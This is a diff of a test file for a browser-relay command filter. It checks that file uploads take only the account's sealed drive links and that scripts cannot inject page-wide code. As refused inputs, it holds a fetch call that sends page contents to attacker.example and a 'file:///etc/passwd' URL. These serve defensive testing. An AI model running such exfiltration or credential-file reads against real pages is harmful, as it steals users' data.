@@ -1,7 +1,7 @@
 import { describe, expect, it } from 'bun:test';
 import { relayRunCommand, relayRunEvent, runSites, type RelayRunTab, type TabUrls } from '../src/commands.js';
 
-const tab: RelayRunTab = { grant: { origins: ['app.example', '*.docs.example'] }, stepsOnly: [], urls: { tabUrl: 'https://app.example/' }, targetId: 'target', session: 'session', sessionId: 'session', addedBy: 'you' };
+const tab: RelayRunTab = { grant: { origins: ['app.example', '*.docs.example'] }, stepsOnly: [], urls: { tabUrl: 'https://app.example/' }, targetId: 'target', session: 'session', sessionId: 'session', addedBy: 'you', account: 'https://account.gitspace.test' };
 
 describe('script commands on your Chrome', () => {
   it.each([
@@ -68,6 +68,18 @@ describe('script commands on your Chrome', () => {
     expect(relayRunCommand('Page.addScriptToEvaluateOnNewDocument', { source: 'fetch("https://attacker.example/?" + document.body.innerHTML)' }, tab)).toHaveProperty('refused');
     expect(relayRunCommand('Page.createIsolatedWorld', { frameId: 'main', worldName: 'utility', grantUniveralAccess: true }, tab)).toEqual({ send: { frameId: 'main', worldName: 'utility', grantUniveralAccess: false } });
   });
+
+  it('puts only the account’s sealed drive links into a file input', () => {
+    const file = { url: 'https://account.gitspace.test/files/token', name: 'a.txt', mediaType: 'text/plain', size: 5 };
+    expect(relayRunCommand('GitSpace.setInputFilesFromUrls', { backendNodeId: 12, files: [file] }, tab)).toEqual({ send: { backendNodeId: 12, files: [file] } });
+    for (const url of ['https://attacker.example/files/token', 'http://account.gitspace.test/files/token', 'https://account.gitspace.test/api/browser-relay/uploads', 'file:///etc/passwd'])
+      expect(relayRunCommand('GitSpace.setInputFilesFromUrls', { backendNodeId: 12, files: [{ ...file, url }] }, tab)).toEqual({ refused: 'GitSpace.setInputFilesFromUrls takes sealed drive links only' });
+    expect(relayRunCommand('GitSpace.setInputFilesFromUrls', { backendNodeId: 12, files: Array.from({ length: 9 }, () => file) }, tab)).toHaveProperty('refused');
+    expect(relayRunCommand('GitSpace.setInputFilesFromUrls', { backendNodeId: 12, files: [{ ...file, size: 51 * 1024 * 1024 }] }, tab)).toHaveProperty('refused');
+    expect(relayRunCommand('GitSpace.setInputFilesFromUrls', { backendNodeId: '12', files: [file] }, tab)).toHaveProperty('refused');
+    // A tab off the script's sites takes no files.
+    expect(relayRunCommand('GitSpace.setInputFilesFromUrls', { backendNodeId: 12, files: [file] }, { ...tab, urls: { tabUrl: 'https://bank.example/' } })).toHaveProperty('refused');
+  });
 });
 
 describe('the sites of one script', () => {
@@ -129,10 +141,6 @@ describe('script events from your Chrome', () => {
     });
     expect(JSON.stringify(relayRunEvent('Network.webSocketWillSendHandshakeRequest', { requestId: '2', request: { headers: { Cookie: 'session=secret', Origin: 'https://app.example' } } }))).not.toContain('secret');
     expect(relayRunEvent('Network.responseReceived', { requestId: '1', hasExtraInfo: true, response: { status: 200, headers: { 'Content-Type': 'text/html' } } })).toEqual({ requestId: '1', hasExtraInfo: false, response: { status: 200, headers: { 'Content-Type': 'text/html' } } });
-  });
-
-  it("keeps the extension's screencast frames from the script, which would acknowledge each one over the relay", () => {
-    expect(relayRunEvent('Page.screencastFrame', { data: 'AA==', sessionId: 1, metadata: {} })).toBeNull();
   });
 
   it('forwards other events unchanged', () => {
